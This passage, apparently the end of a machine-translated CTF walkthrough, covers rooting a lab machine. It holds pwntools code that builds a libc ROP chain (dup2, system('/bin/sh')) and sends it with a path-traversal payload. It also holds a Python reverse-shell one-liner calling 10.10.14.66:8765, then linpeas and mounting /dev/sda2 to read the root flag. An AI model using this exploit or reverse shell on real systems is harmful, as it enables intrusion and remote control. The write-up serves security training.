<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在找到该行的地址/ bin / sh。</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
仍然需要收集ROP，在该ROP中，标准I / O描述符（0,1,2）将被重定向到程序中注册的描述符（请参见6）。</font><font style="vertical-align: inherit;">之后将调用系统功能，我们将在其中传递行/ bin / sh的地址。</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
精细！</font><font style="vertical-align: inherit;">我们从根获得外壳。</font><font style="vertical-align: inherit;">但是他快死了。</font><font style="vertical-align: inherit;">运行侦听器（nc -lvp 8765）并扔回连接外壳。</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="图片"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
而且我们有一个稳定的外壳。</font><font style="vertical-align: inherit;">我在下面的图片中给出了完整的代码。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是我们无法读取根标志...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="图片"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
通过运行linpeas并查看输出，我们找到了有趣的部分，尤其是/ dev / sda2。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们获取有关所有块设备的信息。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我们有根分区/ dev / sda2。</font><font style="vertical-align: inherit;">创建目录并挂载分区。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="图片"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我们找到了根标志。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以通过</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加入我们</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在这里，您可以找到有趣的资料，合并的课程以及软件。</font><font style="vertical-align: inherit;">让我们建立一个社区，在这个社区中，会有一些精通IT领域的人，然后我们可以在任何IT和信息安全性问题上互相帮助。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN502256/index.html">如何使用Neo4j可视化Spring Integration图？</a></li>
<li><a href="../zh-CN502260/index.html">ESP-NOW是ESP8266和ESP32的替代通信协议。基本概念</a></li>
<li><a href="../zh-CN502262/index.html">为什么要对银行进行AIOps和总体监控，或建立在什么客户关系上</a></li>
<li><a href="../zh-CN502264/index.html">公钥基础结构。在自我隔离的情况下签发证书</a></li>
<li><a href="../zh-CN502266/index.html">英特尔平台上的Aurora。Exaflops时代的黎明</a></li>
<li><a href="../zh-CN502272/index.html">不要说“我感到自己”和其他导致昏迷的英语规则</a></li>
<li><a href="../zh-CN502274/index.html">在没有root的情况下自定义Android上外部键盘的布局</a></li>
<li><a href="../zh-CN502276/index.html">看板方法：PNZ示例2：培训和课程</a></li>
<li><a href="../zh-CN502278/index.html">如何不编辑Python测试</a></li>
<li><a href="../zh-CN502286/index.html">消防机器人</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>